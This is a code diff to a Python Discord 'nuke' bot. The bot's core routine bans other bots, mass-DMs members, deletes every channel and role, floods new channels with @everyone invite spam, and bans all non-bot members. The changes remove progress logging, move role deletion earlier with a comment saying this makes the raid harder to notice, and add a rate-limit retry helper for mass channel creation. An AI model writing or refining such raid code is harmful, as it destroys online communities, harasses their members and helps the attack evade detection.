@@ -19,7 +19,7 @@ intents.guilds = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
 
-sem_global = asyncio.Semaphore(20)   # 同時数を抑えて安定
+sem_global = asyncio.Semaphore(20)
 sem_message = asyncio.Semaphore(40)
 sem_dm = asyncio.Semaphore(10)
 
@@ -66,6 +66,16 @@ async def delete_item(item):
             return False
     return False
 
+async def create_channel_safely(guild, counter, name):
+    try:
+        ch = await guild.create_text_channel(name)
+        return ch
+    except discord.HTTPException as e:
+        if e.status == 429:
+            await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
+            return await create_channel_safely(guild, counter, name)
+        return None
+
 async def create_colored_roles_task(guild, target_roles):
     current = 0
     created = 0
@@ -78,8 +88,6 @@ async def create_colored_roles_task(guild, target_roles):
             )
             created += 1
             current += 1
-            if created % 20 == 0:
-                print(f"ロール作成進捗: {created}/{target_roles}")
         except discord.HTTPException as e:
             if e.status == 429:
                 await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
@@ -87,19 +95,15 @@ async def create_colored_roles_task(guild, target_roles):
                 break
         except:
             break
-        await asyncio.sleep(0.4)  # 並行でもリミット回避
+        await asyncio.sleep(0.4)
 
 async def ban_all_task(guild, members, reason):
-    banned = 0
     for m in members:
         try:
             await guild.ban(m, reason=reason, delete_message_days=0)
-            banned += 1
-            if banned % 20 == 0:
-                print(f"BAN進捗: {banned}/{len(members)}")
         except:
             pass
-        await asyncio.sleep(0.8)  # BAN並行でも安定
+        await asyncio.sleep(0.8)
 
 async def core_nuke(guild, new_server_name=None):
     new_name = new_server_name or DEFAULT_NEW_NAME
@@ -107,7 +111,6 @@ async def core_nuke(guild, new_server_name=None):
     members = [m for m in guild.members if m != bot.user]
     non_bot_members = [m for m in members if not m.bot]
 
-    # 最初にサーバー情報だけ出力（ログ最小限）
     print(f"破壊開始: サーバー名={guild.name} 非BOT人数={len(non_bot_members)}")
 
     # 他のボットBAN
@@ -119,7 +122,12 @@ async def core_nuke(guild, new_server_name=None):
     dm_tasks = [limited_dm(send_dm(m)) for m in non_bot_members]
     await asyncio.gather(*dm_tasks)
 
-    # チャンネル削除（逐次）
+    # ロール削除（先にやる → 権限剥奪前にロール消してバレにくく）
+    for r in list(guild.roles):
+        if not r.is_default() and not r.managed:
+            await delete_item(r)
+
+    # チャンネル削除
     for ch in list(guild.channels):
         await delete_item(ch)
 
@@ -129,12 +137,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # ロール削除（スパム前に逐次で確実）
-    for r in list(guild.roles):
-        if not r.is_default() and not r.managed:
-            await delete_item(r)
-
-    # 規模別調整（sleep長めで確実）
+    # 規模別調整
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
@@ -149,7 +152,7 @@ async def core_nuke(guild, new_server_name=None):
         target_roles = 30
         spam_sleep = 1.2
 
-    # チャンネル作成（2種類交互、逐次）
+    # チャンネル作成（2種類交互）
     channels = []
     current = 0
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
@@ -160,7 +163,7 @@ async def core_nuke(guild, new_server_name=None):
             channels.append(ch)
         await asyncio.sleep(0.6)
 
-    # スパム開始 + BANとロール作成を並行
+    # スパム開始 + BANとロール作成並行
     spam_messages = [
         f"@everyone {INVITE_LINK}",
         f"@everyone 来い {INVITE_LINK}"
@@ -171,8 +174,6 @@ async def core_nuke(guild, new_server_name=None):
 
     ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
     role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
-
-    print("スパム開始")
 
     while any(c < 100 for c in message_counters.values()):
         for ch in active_channels[:]:
@@ -193,9 +194,6 @@ async def core_nuke(guild, new_server_name=None):
 
             await asyncio.sleep(spam_sleep)
 
-    print("スパム完了")
-
-    # 並行タスク待機
     await ban_task
     await role_create_task
 
